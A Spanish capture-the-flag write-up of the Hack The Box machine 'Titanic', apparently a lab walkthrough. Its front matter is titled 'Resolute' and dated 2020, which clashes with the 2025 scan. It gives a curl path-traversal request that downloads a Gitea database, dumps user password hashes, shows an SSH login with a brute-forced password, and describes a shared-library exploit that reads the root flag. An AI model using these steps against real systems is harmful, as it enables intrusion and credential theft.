---
layout: single
title: Resolute - Hack The Box
excerpt: "Titanic, una máquina nivel fácil, resultó ser muy fácil. Solo fue un LFI en la página principal encontré un archivo SQL gracias al local file y así pude entrar a la SSH, tener una consola interactiva y tuve que escribir un pequeño script para poder leer root flag"
date: 2020-05-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-titanic/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - wfuzz
  - burp suite
  - sqlite3
  - escalada de privilegios
---


![](/assets/images/htb-writeup-titanic/portada.png)


Titanic, una máquina nivel fácil, resultó ser muy fácil. Solo fue un LFI en la página principal encontré un archivo SQL gracias al local file y así pude entrar a la SSH, tener una consola interactiva y tuve que escribir un pequeño script para poder leer root flag


## Port

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ sudo nmap -p- --open -sCV 10.10.11.55       
   3   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 00:36 UTC
   4   │ Nmap scan report for titanic.htb (10.10.11.55)
   5   │ Host is up (0.11s latency).
   6   │ Not shown: 64033 closed tcp ports (reset), 1500 filtered tcp ports (no-response)
   7   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
   8   │ PORT   STATE SERVICE VERSION
   9   │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
  10   │ | ssh-hostkey: 
  11   │ |   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
  12   │ |_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
  13   │ 80/tcp open  http    Apache httpd 2.4.52
  14   │ | http-server-header: 
  15   │ |   Apache/2.4.52 (Ubuntu)
  16   │ |_  Werkzeug/3.0.3 Python/3.10.12
  17   │ |_http-title: Titanic - Book Your Ship Trip
  18   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  19   │ 
  20   │ Service detection performed. Please report any incorrect results at https://nmap.org/su
       │ bmit/ .
  21   │ Nmap done: 1 IP address (1 host up) scanned in 49.41 seconds
```

## puertos abiertos
- 22
- 80



![](/assets/images/htb-writeup-titanic/titanic.png)


ya probe escaneando un sU y no encontre nada si fuera nivel hart diria que se esta tensando pero como es nivel facil el ataque esta a nuestros ojos es un ataque web


## hacking web

parace que al hacer un ticket podemos hacer un LFI


## archvos de configuracion
- data/gitea/gitea.db
- /var/www/html/.env
- /usr/src/app/.env
- /app/docker-compose.yml


![](/assets/images/htb-writeup-titanic/titanic2.png)


## sqlite3

Descargamos el archivo sql

```
   1   │ ┌──(noesholk㉿noes)-[~/Descargas]
   2   │ └─$ curl -X GET "http://titanic.htb/download?ticket=../../../../../../home/developer/gi
       │ tea/data/gitea/gitea.db" --output gitea.db
   3   │   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
   4   │                                  Dload  Upload   Total   Spent    Left  Speed
   5   │ 100 2036k  100 2036k    0     0  1100k      0  0:00:01  0:00:01 --:--:-- 1099k
   6   │ 
   7   │ 
   8   │ 
   9   │ ┌──(noesholk㉿noes)-[~/Descargas]
  10   │ └─$ sqlite3 gitea.db 
  11   │ SQLite version 3.46.1 2024-08-13 09:16:08
  12   │ Enter ".help" for usage hints.
  13   │ sqlite> help
  14   │ sqlite> .tables
  15   │ access                     oauth2_grant             
  16   │ access_token               org_user                 
  17   │ action                     package                  
  18   │ action_artifact            package_blob             
  19   │ action_run                 package_blob_upload      
  20   │ action_run_index           package_cleanup_rule     
  21   │ action_run_job             package_file             
  22   │ action_runner              package_property         
  23   │ action_runner_token        package_version          
  24   │ action_schedule            project                  
  25   │ action_schedule_spec       project_board            
  26   │ action_task                project_issue            
  27   │ action_task_output         protected_branch         
  28   │ action_task_step           protected_tag            
  29   │ action_tasks_version       public_key               
  30   │ action_variable            pull_auto_merge          
  31   │ app_state                  pull_request             
  32   │ attachment                 push_mirror              
  33   │ auth_token                 reaction                 
  34   │ badge                      release                  
  35   │ branch                     renamed_branch           
  36   │ collaboration              repo_archiver            
  37   │ comment                    repo_indexer_status      
  38   │ commit_status              repo_redirect            
  39   │ commit_status_index        repo_topic               
  40   │ commit_status_summary      repo_transfer            
  41   │ dbfs_data                  repo_unit                
  42   │ dbfs_meta                  repository               
  43   │ deploy_key                 review                   
  44   │ email_address              review_state             
  45   │ email_hash                 secret                   
  46   │ external_login_user        session                  
  47   │ follow                     star                     
  48   │ gpg_key                    stopwatch                
  49   │ gpg_key_import             system_setting           
  50   │ hook_task                  task                     
  51   │ issue                      team                     
  52   │ issue_assignees            team_invite              
  53   │ issue_content_history      team_repo                
  54   │ issue_dependency           team_unit                
  55   │ issue_index                team_user                
  56   │ issue_label                topic                    
  57   │ issue_user                 tracked_time             
  58   │ issue_watch                two_factor               
  59   │ label                      upload                   
  60   │ language_stat              user                     
  61   │ lfs_lock                   user_badge               
  62   │ lfs_meta_object            user_blocking            
  63   │ login_source               user_open_id             
  64   │ milestone                  user_redirect            
  65   │ mirror                     user_setting             
  66   │ notice                     version                  
  67   │ notification               watch                    
  68   │ oauth2_application         webauthn_credential      
  69   │ oauth2_authorization_code  webhook                  
  70   │ sqlite> SELECT * FROM user
  71   │    ...> ;
  72   │ 1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d
       │ 3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50
       │ |0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||17
       │ 22595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root
       │ @titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
  73   │ 2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a5438
       │ 5ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|
       │ 0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||17225
       │ 95646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|develop
       │ er@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
  74   │ 3|aaa|aaa||aa@aa.com|0|enabled|bd7d49bfe391eb6b8591ad04c4f26e985b905c9aba3fd30775d56a3f
       │ 732fdb53b39ea39812124fb83db1a095ca08a88cc884|pbkdf2$50000$50|0|0|0||0|||ca1510e2b622498
       │ e1157939cf961d405|29a4366114a6c9c920f6d04ddb9bfeef|en-US||1739773179|1739774475|1739774
       │ 460|0|-1|1|0|0|0|0|1|0|390105a4ab80cde30259b6c6bd055be4|aa@aa.com|0|0|0|0|1|0|0|0|0|uni
       │ fied|gitea-auto|0
  75   │ 4|test|test||test@gmail.com|0|enabled|6638c243f2bb528f55c1389421e603b73e24f66e07b75a6ea
       │ 10bd3308b11bc1308ac72bb39174e86c40952e289f913816828|pbkdf2$50000$50|0|0|0||0|||b2f85a00
       │ d7baadfce7601d032f33a138|3ca2ab8c26587fe3064d1df668788507|en-US||1739774376|1739774857|
       │ 1739774376|0|-1|1|0|0|0|0|1|0|1aedb8d9dc4751e229a335e371db8058|test@gmail.com|0|0|0|0|0
       │ |0|0|0|0|unified|gitea-auto|0
  76   │ 5|test1|test1||a@a.com|0|enabled|cb017c84bebaa8eb86cc6f8e54ea25f9f819b632734ad4d6f4c04e
       │ 3f867ceb5dd3d092efd8faf27bd3c92df60a7663d392dd|pbkdf2$50000$50|0|0|0||0|||35f3ad1c007fd
       │ 11071cb5dda1f08e80c|ee4a3c3fac5c0902a5ef8ed477678f6d|en-US||1739775734|1739775736|17397
       │ 75734|0|-1|1|0|0|0|0|1|0|d10ca8d11301c2f4993ac2279ce4b930|a@a.com|0|0|0|0|0|0|0|0|0||gi
       │ tea-auto|0
  77   │ sqlite> ;
  78   │ sqlite> SELECT * FROM user
  79   │    ...> ;
  80   │ 1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d
       │ 3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50
       │ |0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||17
       │ 22595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root
       │ @titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
  81   │ 2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a5438
       │ 5ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|
       │ 0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||17225
       │ 95646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|develop
       │ er@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
  82   │ 3|aaa|aaa||aa@aa.com|0|enabled|bd7d49bfe391eb6b8591ad04c4f26e985b905c9aba3fd30775d56a3f
       │ 732fdb53b39ea39812124fb83db1a095ca08a88cc884|pbkdf2$50000$50|0|0|0||0|||ca1510e2b622498
       │ e1157939cf961d405|29a4366114a6c9c920f6d04ddb9bfeef|en-US||1739773179|1739774475|1739774
       │ 460|0|-1|1|0|0|0|0|1|0|390105a4ab80cde30259b6c6bd055be4|aa@aa.com|0|0|0|0|1|0|0|0|0|uni
       │ fied|gitea-auto|0
  83   │ 4|test|test||test@gmail.com|0|enabled|6638c243f2bb528f55c1389421e603b73e24f66e07b75a6ea
       │ 10bd3308b11bc1308ac72bb39174e86c40952e289f913816828|pbkdf2$50000$50|0|0|0||0|||b2f85a00
       │ d7baadfce7601d032f33a138|3ca2ab8c26587fe3064d1df668788507|en-US||1739774376|1739774857|
       │ 1739774376|0|-1|1|0|0|0|0|1|0|1aedb8d9dc4751e229a335e371db8058|test@gmail.com|0|0|0|0|0
       │ |0|0|0|0|unified|gitea-auto|0
  84   │ 5|test1|test1||a@a.com|0|enabled|cb017c84bebaa8eb86cc6f8e54ea25f9f819b632734ad4d6f4c04e
       │ 3f867ceb5dd3d092efd8faf27bd3c92df60a7663d392dd|pbkdf2$50000$50|0|0|0||0|||35f3ad1c007fd
       │ 11071cb5dda1f08e80c|ee4a3c3fac5c0902a5ef8ed477678f6d|en-US||1739775734|1739775736|17397
       │ 75734|0|-1|1|0|0|0|0|1|0|d10ca8d11301c2f4993ac2279ce4b930|a@a.com|0|0|0|0|0|0|0|0|0||gi
       │ tea-auto|0
  85   │ sqlite> ^Z
  86   │ zsh: suspended  sqlite3 gitea.db
```


despues de usar fuerza bruta lobramos optener una contraseña


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ ssh developer@titanic.htb
   3   │ developer@titanic.htb's password: 
   4   │ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
   5   │ 
   6   │  * Documentation:  https://help.ubuntu.com
   7   │  * Management:     https://landscape.canonical.com
   8   │  * Support:        https://ubuntu.com/pro
   9   │ 
  10   │  System information as of Mon Feb 17 08:37:27 AM UTC 2025
  11   │ 
  12   │   System load:           0.49
  13   │   Usage of /:            69.9% of 6.79GB
  14   │   Memory usage:          15%
  15   │   Swap usage:            0%
  16   │   Processes:             261
  17   │   Users logged in:       1
  18   │   IPv4 address for eth0: 10.10.11.55
  19   │   IPv6 address for eth0: dead:beef::250:56ff:feb0:df2b
  20   │ 
  21   │ 
  22   │ Expanded Security Maintenance for Applications is not enabled.
  23   │ 
  24   │ 0 updates can be applied immediately.
  25   │ 
  26   │ Enable ESM Apps to receive additional future security updates.
  27   │ See https://ubuntu.com/esm or run: sudo pro status
  28   │ 
  29   │ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Interne
       │ t connection or proxy settings
  30   │ 
  31   │ 
  32   │ The programs included with the Ubuntu system are free software;
  33   │ the exact distribution terms for each program are described in the
  34   │ individual files in /usr/share/doc/*/copyright.
  35   │ 
  36   │ Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  37   │ applicable law.
  38   │ 
  39   │ Last login: in**     from 10.10.16.60
  40   │ developer@titanic:~$
```

```
  47   │ developer@titanic:/tmp$ nano exploit
  48   │ developer@titanic:/tmp$ chmod +x exploit
  49   │ developer@titanic:/tmp$ ./exploit
  50   │ developer@titanic:/tmp$ ls
  51   │  exploit
  52   │ 'GCONV_PATH=.'
  53   │  magick-qSv4nttrFhVApE3AwJdxsutwLspGfExb
  54   │  magick-WcYYaehZRO2L_dCmxTf_ymUC_SYz548h
  55   │  PwnKit
  56   │  snap-private-tmp
  57   │  systemd-private-d0f2a24b918c44d0a62f6c8233ae23a4-apache2.service-pqzc8J
  58   │  systemd-private-d0f2a24b918c44d0a62f6c8233ae23a4-ModemManager.service-aHDfa5
  59   │  systemd-private-d0f2a24b918c44d0a62f6c8233ae23a4-systemd-logind.service-RnRwAF
  60   │  systemd-private-d0f2a24b918c44d0a62f6c8233ae23a4-systemd-resolved.service-snrtd9
  61   │  systemd-private-d0f2a24b918c44d0a62f6c8233ae23a4-systemd-timesyncd.service-lPaKdZ
  62   │  vmware-root_611-3980232955
  63   │ developer@titanic:/tmp$ ls^C
  64   │ developer@titanic:/tmp$ mv exploit exploit.txt
  65   │ developer@titanic:/tmp$ ./exploit.txt
  66   │ developer@titanic:/tmp$ ls
  67   │ 
  68   │ 
  69   │ developer@titanic:/tmp$ ./exploit.txt
  70   │ developer@titanic:/tmp$ cat rootflag
  71   │ 1a417f2737812ef173ccf42140d8c1b9
```


`Este código crea una biblioteca compartida (libxcb.so.1) que, al cargarse, ejecuta automáticamente una función (mediante el atributo constructor). En esa función se lee el contenido de /root/root.txt y se escribe en /tmp/rootflag, luego se finaliza el proceso. Es una técnica para ejecutar código arbitrario al cargar la biblioteca.`
